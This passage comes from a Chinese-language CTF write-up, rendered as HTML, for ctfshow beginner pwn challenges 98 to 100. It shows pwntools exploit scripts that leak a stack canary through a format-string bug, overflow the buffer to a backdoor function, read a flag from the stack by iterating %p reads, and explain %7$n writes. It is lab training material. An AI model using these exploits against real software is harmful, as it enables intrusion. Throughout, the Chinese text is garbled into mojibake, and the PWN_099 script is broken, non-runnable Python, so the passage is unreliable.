</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn_098">PWN_098
</h3><p>é¢˜ç›®ï¼šCanaryï¼Ÿæœ‰æ²¡æœ‰åŠæ³•ç»•è¿‡å‘¢ï¼Ÿ</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/325.png"
	width="954"
	height="203"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/325_hu_d524510bcabe75ca.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/325_hu_9c2533147aae684c.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="469"
		data-flex-basis="1127px"
	
></p>
<p>32ä½å¼€å¯Canaryï¼ŒNXï¼Œéƒ¨åˆ†å¼€å¯RELROã€‚</p>
<p>IDA32ä½åˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/326.png"
	width="655"
	height="225"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/326_hu_7ccea2940a79c12d.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/326_hu_fd99573e4906f9b0.png 1024w"
	loading="lazy"
	
		alt="ctfshowå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="291"
		data-flex-basis="698px"
	
></p>
<p>_stack_checkå‡½æ•°ç»™äº†åé—¨å‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/327.png"
	width="730"
	height="113"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/327_hu_ce3da6be7b88b899.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/327_hu_c3192be08c9ebaa1.png 1024w"
	loading="lazy"
	
		alt="_stack_checkå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="646"
		data-flex-basis="1550px"
	
></p>
<p>å¾ˆæ˜æ˜¾çš„æœ‰æ ˆæº¢å‡ºæ¼æ´å’Œæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†æ˜¯ç”±äºå¼€å¯äº†Canaryï¼Œç›´æ¥æº¢å‡ºçš„è¯è‚¯å®šæ˜¯ä¸è¡Œçš„ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å…ˆé€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å»æ³„æ¼Canaryçš„å€¼ã€‚</p>
<p>å…ˆæ‰¾canaryçš„ä½ç½®ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/328.png"
	width="780"
	height="195"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/328_hu_12dbc73b0f9875d0.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/328_hu_4f463f2dad88a151.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="400"
		data-flex-basis="960px"
	
></p>
<p>ä¸Šgdbè°ƒè¯•çœ‹çœ‹canaryåœ°å€çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»é‡ï¼š15</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/329.png"
	width="1086"
	height="120"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/329_hu_aca9257f162d6768.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/329_hu_f43fa8667cce2814.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="905"
		data-flex-basis="2172px"
	
></p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28270</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">shell</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__stack_check&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;%15$x&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Canary : 0x</span><span class="si">%x</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">canary</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x28</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mh">0xC</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">shell</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">é«˜åœ°å€
</span></span><span class="line"><span class="cl">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
</span></span><span class="line"><span class="cl">â”‚ è¿”å›åœ°å€    â”‚  &lt;-- éœ€è¦è¦†ç›–è¿™é‡Œè·³è½¬åˆ° shell
</span></span><span class="line"><span class="cl">â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
</span></span><span class="line"><span class="cl">â”‚ Canary      â”‚  &lt;-- éœ€è¦å…ˆè¦†ç›–è¿™é‡Œï¼ˆç»•è¿‡ä¿æŠ¤ï¼‰
</span></span><span class="line"><span class="cl">â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
</span></span><span class="line"><span class="cl">â”‚ å…¶ä»–å±€éƒ¨å˜é‡ â”‚
</span></span><span class="line"><span class="cl">â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
</span></span><span class="line"><span class="cl">â”‚ s[40]       â”‚  &lt;-- ç¼“å†²åŒºæœ¬èº«ï¼ˆ0x28 å­—èŠ‚ï¼‰
</span></span><span class="line"><span class="cl">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</span></span><span class="line"><span class="cl">ä½åœ°å€
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn_099">PWN_099
</h3><p>é¢˜ç›®ï¼šfmtç›²æ‰“ï¼ˆä¸æ˜¯å¿˜è®°æ”¾é™„ä»¶ï¼Œæ˜¯æœ¬èº«å°±æ²¡é™„ä»¶ï¼ï¼ï¼ï¼‰</p>
<p>è¿è¡Œï¼š<strong>ä½ ä¹Ÿè¦æ¥èµ·èˆå—ï¼Ÿ</strong></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/330.png"
	width="1195"
	height="499"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/330_hu_308fb13f9b09e43c.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/330_hu_439ff91dce22ce14.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="239"
		data-flex-basis="574px"
	
></p>
<p>æœ‰æç¤ºï¼šflagè¿˜åœ¨æ ˆä¸Šï¼Œè€Œä¸”è¿˜çŸ¥é“è¿™ç¨‹åºæ˜¯å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„ã€‚</p>
<p>æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»é‡ä¸º6()ç”¨å¤„ä¸å¤§ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/331.png"
	width="1644"
	height="609"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/331_hu_d48669f8d3c4f0f7.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/331_hu_27d099db37d577c8.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="269"
		data-flex-basis="647px"
	
></p>
<p>æ—¢ç„¶å‘Šè¯‰äº†æˆ‘ä»¬flagåœ¨æ ˆä¸Šï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„ä»»æ„è¯»åŠŸèƒ½å»å°è¯•è¯»ä¸€ä¸‹è¯•è¯•ï¼Œexpï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28260</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;%</span><span class="si">{i}</span><span class="s2">$p&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æˆ‘çš„pythonoä¸æ˜¯å¾ˆå¥½ï¼Œè¿™é‡Œæˆ‘ç›´æ¥ç›²æ‰“å‡ºflagï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/332.png"
	width="1688"
	height="610"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/332_hu_e92e8ab0cec016b3.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/332_hu_fff80778e93e3e3.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="276"
		data-flex-basis="664px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/334.png"
	width="1399"
	height="736"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/334_hu_a0c14648aa40ff61.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/334_hu_f48fc701477363a2.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="190"
		data-flex-basis="456px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/333.png"
	width="965"
	height="537"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/333_hu_8c1665f60bd8a3db.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/333_hu_6ace131cc0d4215.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="179"
		data-flex-basis="431px"
	
></p>
<p>ctfshow{W0w_y0u_c@n_r3@11y_d@nce!}</p>
<h3 id="pwn_100">PWN_100
</h3><p>é¢˜ç›®ï¼šæœ‰äº›ä¸œè¥¿å¥½åƒéœ€è¦ä¸€å®šæ¡ä»¶ã€‚</p>
<p><strong>æ³¨ï¼šæœ¬é¢˜æœ‰å‚è€ƒå…¶å®ƒå¤§ä½¬çš„WP</strong></p>
<p>checksecä¸¤çœ¼ä¸€é»‘ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/335.png"
	width="865"
	height="229"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/335_hu_6cd5bb5e220e90b6.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/335_hu_64afe0192c2707cb.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="377"
		data-flex-basis="906px"
	
></p>
<p>64ä½ä¿æŠ¤å…¨å¼€ã€‚</p>
<p>IDA64ä½åˆ†æmainå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/339.png"
	width="863"
	height="776"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/339_hu_7b2a1d5de701fbb0.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/339_hu_d79849023706a2b6.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="111"
		data-flex-basis="266px"
	
></p>
<p>è·Ÿè¿›menuå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/336.png"
	width="644"
	height="255"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/336_hu_d35cc9bc60750f19.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/336_hu_76dbb5503adf5e14.png 1024w"
	loading="lazy"
	
		alt="menuå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="252"
		data-flex-basis="606px"
	
></p>
<p>è·Ÿè¿›fmt_attackå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/337.png"
	width="796"
	height="351"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/337_hu_8d28bd40b9f02e2c.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/337_hu_33ed18f86f11f393.png 1024w"
	loading="lazy"
	
		alt="fmt_attackå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="226"
		data-flex-basis="544px"
	
></p>
<p>å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œè¿™é‡Œè¿˜æœ‰ä¸ªa1å€¼åœ¨æ ¡éªŒfmt_attack()å‡½æ•°çš„è¿è¡Œæ¬¡æ•°ï¼Œè¿˜è¦å»ä¿®æ”¹a1ä¸º0ï¼Œä»è€Œé€šè¿‡<code>if( *a1 &gt; 0 )</code>çš„æ£€éªŒï¼Œæ‰€ä»¥éœ€è¦å¤šæ¬¡åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ‰‹æ³•ã€‚</p>
<p>è·Ÿè¿›leakå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/338.png"
	width="624"
	height="330"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/338_hu_f22a809703a9a042.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/338_hu_c71d5844816a2962.png 1024w"
	loading="lazy"
	
		alt="leakå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="189"
		data-flex-basis="453px"
	
></p>
<p>è·Ÿè¿›get_flagå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/340.png"
	width="815"
	height="430"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/340_hu_cb79493f94c998c5.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/340_hu_c8000fc4061826d1.png 1024w"
	loading="lazy"
	
		alt="get_flagå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="189"
		data-flex-basis="454px"
	
></p>
<p><code>close(1)</code>å…³é—­äº†è¾“å‡ºæµï¼Œä¹Ÿå°±æ˜¯è¯´ä¸‹é¢çš„flagè¾“å‡ºä¸äº†ï¼Œå¦‚æœæˆ‘ä»¬èƒ½ç›´æ¥è·³è½¬åˆ°çº¢æ¡†éƒ¨åˆ†å°±èƒ½æ‹¿åˆ°flagï¼Œå¯ä»¥åˆ©ç”¨è·³è½¬åœ°å€çš„æ–¹å¼ç»•è¿‡close(1)ï¼Œä»fd=&hellip;.è¿™é‡Œå¼€å§‹ã€‚</p>
<p>æŒ‰Tabé”®æŸ¥çœ‹æ±‡ç¼–ä»£ç å—ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/341.png"
	width="1070"
	height="559"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/341_hu_4479acd055bb21ad.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/341_hu_a63748164fbef43e.png 1024w"
	loading="lazy"
	
		alt="getshellçš„ç›¸å¯¹åœ°å€:0xF56"
	
	
		class="gallery-image" 
		data-flex-grow="191"
		data-flex-basis="459px"
	
></p>
<p>æ¥ï¼Œæˆ‘ä»¬çœ‹å›fmt_attackå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/337.png"
	width="796"
	height="351"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/337_hu_8d28bd40b9f02e2c.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/337_hu_33ed18f86f11f393.png 1024w"
	loading="lazy"
	
		alt="fmt_attackå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="226"
		data-flex-basis="544px"
	
></p>
<p>è¿™é‡Œæœ‰å¾ˆå¤šå‚æ•°ï¼Œä½†a1æ˜¯ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°çš„ï¼Œæˆ‘ä»¬å¾—çŸ¥è¿™æ˜¯ä¸€ä¸ª64ä½ç¨‹åºï¼Œå‰6ä½å‚æ•°æ˜¯é å¯„å­˜å™¨ä¼ å‚çš„ï¼Œæ‰€ä»¥è¯´a1æ˜¯å½’å¯„å­˜å™¨rdiç®¡çš„ï¼Œåœ¨æ‰§è¡Œprintfæ—¶ï¼Œç”±äºç¨‹åºæ²¡æœ‰è¿è¡Œå®Œæ¯•ï¼Œå‚æ•°æ²¡æœ‰å½’ä½ï¼Œa1è¿˜æ˜¯åœ¨å¯„å­˜å™¨rdiä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾å‡ºa1çš„åœ°å€ä»è€Œé€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è¿›è¡Œä»»æ„æ”¹å†™ã€‚</p>
<p>çœ‹æ±‡ç¼–è¯­è¨€ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/342.png"
	width="975"
	height="506"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/342_hu_28af216ae8a836cd.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/342_hu_25fa7c497a6b67c4.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="192"
		data-flex-basis="462px"
	
></p>
<p>è¿™é‡Œ<code>rbp+var_48</code>ä¹Ÿå°±æ˜¯<code>rbp-0x48</code>å°±æ˜¯å­˜ <code>a1</code>åœ°å€çš„åœ°æ–¹ï¼Œè€Œä¸”å³ä¸‹æ–¹çš„å°±æ˜¯ç¬¬äºŒä¸ª<code>a1</code>çš„ä½ç½®ï¼Œç„¶ågdbè°ƒè¯•çœ‹çœ‹åœ°å€ï¼Œç»™fmt_attackå‡½æ•°æ–­ç‚¹çœ‹çœ‹a1çš„å˜åŒ–åçš„åœ°å€åœ¨å“ªï¼š</p>
<blockquote>
<p><code>var_48</code> æ˜¯ IDA å¯¹æ ˆåç§»çš„ â€œç¬¦å·åŒ–å‘½åâ€ï¼Œ<code>[rbp+var_48]</code> æœ¬è´¨å°±æ˜¯ <code>[rbp-0x48]</code>â€”â€” ä¸‹åˆ’çº¿ä»…ä¸ºå‘½åè§„èŒƒï¼Œä¸å½±å“å®é™…åç§»è®¡ç®—ã€‚</p>
</blockquote>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/343.png"
	width="1918"
	height="854"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/343_hu_4215c60875212b1.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/343_hu_169cc92bf6d681e8.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="224"
		data-flex-basis="539px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°èµ·åˆrbpåœ°å€æ˜¯0x7fffffffda38ï¼Œåé¢rbp-0x38å˜æˆ0x7fffffffda38ï¼Œå¯ä»¥å‘ç°<code>[rbp-0x48]</code>å¯¹åº”çš„å€¼æ˜¯<code>0</code>ï¼Œæ¥ç€ä¸€ç›´næ­¥è¿›åˆ°printf/readå‡½æ•°å¯ä»¥å‘ç°ï¼šå½“æˆ‘ä»¬nè·³è¿‡<strong>mov    dword ptr [rax], 1</strong>ï¼Œå‘ç°rbp-0x48ä½ç½®çš„å­˜å‚¨å€¼å˜æˆ1äº†ï¼šçœ‹å›¾1ã€2çš„å˜åŒ–ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/344.png"
	width="1918"
	height="853"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/344_hu_2e52db5d5e4dd358.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/344_hu_a9d8e80cedf4aa58.png 1024w"
	loading="lazy"
	
		alt="å›¾1"
	
	
		class="gallery-image" 
		data-flex-grow="224"
		data-flex-basis="539px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/345.png"
	width="1918"
	height="844"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/345_hu_b5407108557e89e.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/345_hu_3c896381d10edda0.png 1024w"
	loading="lazy"
	
		alt="å›¾2"
	
	
		class="gallery-image" 
		data-flex-grow="227"
		data-flex-basis="545px"
	
></p>
<p>çœ‹åˆ°å›¾2ï¼šç¬¬ä¸€ä¸ªçº¢æ¡†çš„æ˜¯ rbp çš„åœ°å€ï¼Œå‡å»<code>0x48</code>å°±æ˜¯ç¬¬ä¸‰ä¸ªçº¢æ¡†é‡Œçš„åœ°å€ï¼Œè¿™é‡ŒæŒ‡å‘<code>a1</code>çš„åœ°å€ï¼Œæ­¤æ—¶<code>a1</code>å·²ç»æ˜¯<code>1 </code>äº†ï¼›é‚£æˆ‘ä»¬ç›®çš„æ˜¯è¦æ”¹å†™ç¬¬äºŒä¸ªa1çš„å€¼å˜æˆ<code>0</code>ï¼Œçœ‹çœ‹å®ƒçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²åç§»ï¼š7</p>
<img src="346.png" style="zoom:150%;" />
<blockquote>
<p>å…¶å®å¯ä»¥æ¢ç§æ–¹å¼ç†è§£ï¼š<code>a1</code>åœ¨æ ˆä¸Šçš„ç¬¬äºŒä¸ªä½ç½®ï¼Œå¯¹äº printf æ¥è¯´ï¼Œrdi æ˜¯å‡½æ•°æœ¬èº«ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ rsiï¼Œç„¶åæ˜¯ rdxã€rcxã€r8ã€r9ï¼Œæ ˆä¸Šç¬¬ä¸€ä¸ªï¼Œæ ˆä¸Šç¬¬äºŒä¸ªçš„<code>a1</code>å°±æ˜¯ç¬¬ä¸ƒä¸ªå‚æ•°ã€‚</p>
</blockquote>
<p>æˆ‘ä»¬åªè¦åœ¨æ¯æ¬¡çš„ payload å¼€å§‹å†™ä¸Š<code>%7$n</code>å³å¯å°†<code>a1</code>æ”¹ä¸º<code>0</code>&hellip;</p>
<blockquote>
<p>ä½ ä¹Ÿè®¸çœ‹ä¸æ‡‚è¿™é‡Œçš„%7$næ˜¯ä»€ä¹ˆæ„æ€ï¼Œæˆ‘åœ¨è¿™é‡Œç»™ä½ è¯¦ç»†è§£é‡Šï¼š</p>
<p><code>%7$n</code> æœ¬èº«ä¸æ˜¯ä¸€ä¸ª â€œå…·ä½“æ•°å€¼â€ï¼Œè€Œæ˜¯ä¸€ä¸ª<strong>æ ¼å¼åŒ–å­—ç¬¦ä¸²æŒ‡ä»¤</strong>â€”â€” å®ƒçš„ä½œç”¨æ˜¯ï¼šæŠŠ â€œå½“å‰å·²è¾“å‡ºçš„å­—ç¬¦æ•°â€ ä½œä¸ºæ•°å€¼ï¼Œè¦†ç›–åˆ° <code>ç¬¬7ä¸ªæ ˆå‚æ•°æŒ‡å‘çš„å†…å­˜åœ°å€</code>ï¼ˆä¹Ÿå°±æ˜¯ä½ è°ƒè¯•ä¸­çš„ <code>0x7fffffffda9c</code>ï¼Œå³ <code>a1</code> æŒ‡å‘çš„åœ°å€ï¼‰ï¼Œé‚£ä¹ˆï¼š</p>
<ul>
<li>ä½ çš„ payload æ˜¯ <code>b'%7$n'</code>ï¼šå¼€å¤´æ²¡æœ‰ä»»ä½•é¢å¤–å­—ç¬¦ï¼Œæ‰§è¡Œåˆ° <code>%7$n</code> æ—¶ï¼Œå·²è¾“å‡ºå­—ç¬¦æ•° = 0 â†’ æ‰€ä»¥ç”¨æ¥è¦†ç›–çš„æ•°å€¼æ˜¯ <strong>0</strong>ã€‚</li>
<li>å¦‚æœ payload æ˜¯ <code>b'abc%7$n'</code>ï¼šæ‰§è¡Œåˆ° <code>%7$n</code> æ—¶å·²è¾“å‡º <code>abc</code> 3 ä¸ªå­—ç¬¦ â†’ è¦†ç›–çš„æ•°å€¼å°±æ˜¯ 3ã€‚</li>
</ul>
</blockquote>
<p>expå¤ªå¤æ‚äº†ï¼Œæˆ‘ä¸€æ­¥æ­¥æ¥å°è¯•ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/347.png"
	width="466"
	height="725"
